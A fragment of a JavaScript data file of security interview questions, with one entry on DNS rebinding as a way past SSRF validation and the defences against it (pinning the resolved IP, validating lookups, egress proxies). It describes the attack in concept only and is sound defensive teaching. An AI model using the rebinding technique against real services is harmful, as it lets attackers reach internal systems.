        category: 'advanced', kind: 'concept', difficulty: 'advanced', topic: 'SSRF',
        question: 'What is DNS rebinding in the context of SSRF, and how do you neutralise it?',
        shortAnswer: 'The attacker\'s DNS returns a safe public IP when you validate and an internal IP when you connect; neutralise it by resolving once and connecting to that exact validated IP.',
        detailedAnswer: [
          'Attacker controls the authoritative DNS for their domain and sets TTL 0.',
          'Lookup #1 (your validator) → 93.x.x.x, passes.',
          'Lookup #2 (your HTTP client) → 127.0.0.1, request goes internal.',
          'Fix: custom `lookup` on the agent that validates every resolution, or connect by IP and send the Host header / SNI manually.',
          'Egress proxy that enforces the policy at connect time is the most robust.',
        ],
        followUp: 'Does caching DNS results in your app fully solve it?',
        trap: 'Thinking a short TTL check or a second lookup makes it safe.',
      },
    ],
  },
};

export default content;
